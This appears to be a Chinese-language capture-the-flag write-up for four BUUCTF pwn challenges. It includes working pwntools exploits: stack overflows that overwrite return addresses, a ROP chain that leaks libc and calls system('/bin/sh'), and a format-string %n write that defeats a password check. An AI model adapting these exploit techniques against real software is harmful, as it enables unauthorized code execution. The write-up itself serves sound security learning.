# rip
根据IDA加载入main函数声明发现s数组距离`rbp`的距离为F，即为15，这里的运行环境是64位，所以应当将`Caller's rbp`的数据填满，在这里是8位，即可构造payload
```python
from pwn import *
p=remote("node4.buuoj.cn", 25401)
#p=process("./pwn1")
payload=b'a'*15+b'b'*8+p64(0x401186+1)
p.sendline(payload)
p.interactive()
```
# jarvisoj_level0
打开IDA主函数两条命令，很明显可利用漏洞就在`vulnerable_function`函数内，进入后看到buf很明显距离rbp有0x80位，再加上64位机多出来的8位，即覆盖`0x80+0x8`即可覆盖，另外有`callsystem`函数作为漏洞执行入口
```python
from pwn import *
p=remote("node4.buuoj.cn", 27716)
#p=process("./level0")
payload=b'a'*136+p64(0x400596)
#p.sendline(payload)
p.sendlineafter('Hello, World\n',payload)
p.interactive()
```

# ciscn_2019_c_1
首先获取程序的ROP信息`ROPgadget --binary ciscn_2019_c_1 --only 'pop|ret'`
![ROPinfo](https://image.0error.net/img/202220220610191811.png)
后面的具体操作见代码注释
```python
from pwn import *
from LibcSearcher import *
p=remote("node4.buuoj.cn", 27706)
#p=process("./ciscn_2019_c_1")
elf=ELF("./ciscn_2019_c_1")
main=0x400b28
rdi=0x400c83
ret=0x4006b9
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
p.sendlineafter('Input your choice!\n', '1')
payload=b'\0'+b'a'*(0x50-1+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)#构造以输出puts_got的内容
p.sendlineafter('Input your Plaintext to be encrypted\n', payload)
p.recvline()
p.recvline()
puts_addr=u64(p.recvuntil('\n')[:-1].ljust(8, b'\0'))#得到puts函数的地址
libc=LibcSearcher("puts", puts_addr)
libc_base=puts_addr-libc.dump("puts")
sys_addr=libc_base+libc.dump("system")
binsh=libc_base+libc.dump("str_bin_sh")#使用LibcSearcher找到对应的libc版本号
p.sendlineafter('choice!\n', '1')
#由于Ubuntu18运行机制与前面版本的不同，在调用system的时候需要进行栈对齐，在这里可以使用ret进行栈对齐
payload=b'\0'+b'a'*(0x50-1+8)+p64(ret)+p64(rdi)+p64(binsh)+p64(sys_addr)
#p.sendline(payload)
p.sendlineafter('encrypted\n',payload)
p.interactive()
```
经过暴力循环测试法，测得最终的libc版本为`libc6_2.27-0ubuntu3_amd64`，然后即可打通本poc  
# [第五空间2019 决赛]PWN5(格式化字符串)
试着运行一下先，发现当输入的长度比较长的时候，回显会出现一点问题，所以合理猜测输出语句存在问题。
![out](https://image.0error.net/img/202220220610204552.png)  
使用32位IDA载入，直接查看main函数
```c
int __cdecl main(int a1)
{
  unsigned int v1; // eax
  int result; // eax
  int fd; // [esp+0h] [ebp-84h]
  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
  char buf[100]; // [esp+14h] [ebp-70h] BYREF
  unsigned int v6; // [esp+78h] [ebp-Ch]
  int *v7; // [esp+7Ch] [ebp-8h]

  v7 = &a1;
  v6 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  v1 = time(0);
  srand(v1);
  fd = open("/dev/urandom", 0);
  read(fd, &dword_804C044, 4u);
  printf("your name:");
  read(0, buf, 0x63u);
  printf("Hello,");
  printf(buf);
  printf("your passwd:");
  read(0, nptr, 0xFu);
  if ( atoi(nptr) == dword_804C044 )
  {
    puts("ok!!");
    system("/bin/sh");
  }
  else
  {
    puts("fail");
  }
  result = 0;
  if ( __readgsdword(0x14u) != v6 )
    sub_80493D0();
  return result;
}
```
首先看了看栈溢出漏洞，read做了限制字符大小利用不了，但是看到了一个`printf(buf)`这就是一个明显的格式化字符漏洞，再结合题目分析一波，大概流程是随机生成一个数字存入到地址为`dword_804C044`的全局变量中，最后对输入的`passwd`字符进行比较，这里注意下`atoi`这个函数它只会提取正整数，除此之外都是返回0，因为`dword`变量是随机数，所以控制不了（之前见过一题也是随机数，但是它的随机种子在栈里面是可控的，然后用栈溢出，再引用`ctypes`库，加载`libc.so.6`然后就可以获得系统一样的随机数了），但是这题很明显就是通过`printf(buf)`这个漏洞去更改`dword`变量的值  
关于格式化字符串攻击，这里可以从以下两个资料着手了解  
[详谈Format String](https://www.cnblogs.com/0xJDchen/p/5904816.html)
[【整理笔记】格式化字符串漏洞梳理](https://sec.mrfan.xyz/2018/10/23/%E3%80%90%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/)\
利用`AAAA %08x %08x %8x %08x %08x %08x %08x...`这样的字符串来找到我们输入的参数在函数栈上的位置\
假设是在栈中的第n位，则可利用`%n$`定位到参数在栈上的位置，特别值得一提的是，这里的%n中如果是n则默认只想ESP指向的栈顶的内容指向的内存地址，而如果是一个具体的数值x则是指向[ESP+x]\
因此在这道题中，我们就可以把我们不知道的`dword_804C044`改为我们设定的数值即可，由此编写poc
```python
from pwn import *

p = remote("node4.buuoj.cn", 28042)

addr=0x0804C044
payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)
payload+=b'%10$n%11$n%12$n%13$n'
p.sendline(payload)
p.sendline(str(0x10101010))
p.interactive()
```
最终得到flag